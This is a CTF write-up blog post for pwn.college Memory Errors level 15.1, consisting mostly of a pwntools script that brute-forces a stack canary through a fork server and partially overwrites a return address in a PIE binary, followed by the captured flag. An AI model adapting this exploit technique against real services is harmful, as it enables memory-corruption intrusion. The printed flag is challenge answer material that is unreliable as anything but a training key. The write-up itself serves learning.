---
layout: post
title: (Memory Errors) level 15.1
date: 2025-07-09 15:09:01 +0300
categories: pwn.college Memory-Errors
tags: pwn.college memory-errors partial-overwrite brute-force stack-canary buffer-overflow
---

## Information 
- category: pwn

## Description 
> Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.

## Write-up
> Like `level15.0`, this challenge follows a similar pattern — refer back to it if needed.
{: .prompt-tip}

## Exploit 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./babymem-level-15-0_patched")

context.binary = exe


def conn():
    r = remote("127.0.0.1", 1337)

    return r

def send_payload(p, payload):

    p.sendline(f"{len(payload)}".encode())
    p.send(payload)


def brute_force_canary():
    canary = b"\x00"
    i = 0x00
    while len(canary) < 0x8:
        for i in range(0x00,0xff):
            with remote("127.0.0.1" , 1337) as p:
                send_payload(p, b"A"*88 + canary + bytes([i]) )
                res = p.recvall(timeout=4)
                if b"*** stack smashing detected ***" not in res:
                    canary+= bytes([i])
                    break

    log.success(f"Canary: {canary}")

    return canary
def jump_to_win(canary):
    i = 0x00
    while i < 0xff:
        p = conn()
        fixed = b"\x1f"
        padding_to_canary = b"A"*88
        padding_to_ret = b"B"*8

        payload = padding_to_canary + canary + padding_to_ret + fixed + bytes([i])

        send_payload(p, payload)
        res = p.recvall()
        if b"pwn.college" in res:
            print(res.decode())
            break
        else:
            i += 0x1

def main():
    canary = brute_force_canary()

    jump_to_win(canary)


if __name__ == "__main__":
    main()
```

## Flag
> Flag: ```pwn.college{DL5cTNxgzPiU_TYZgFn1dHA8_jccjiejPdTj.01NxMDL5cTNxgzW}```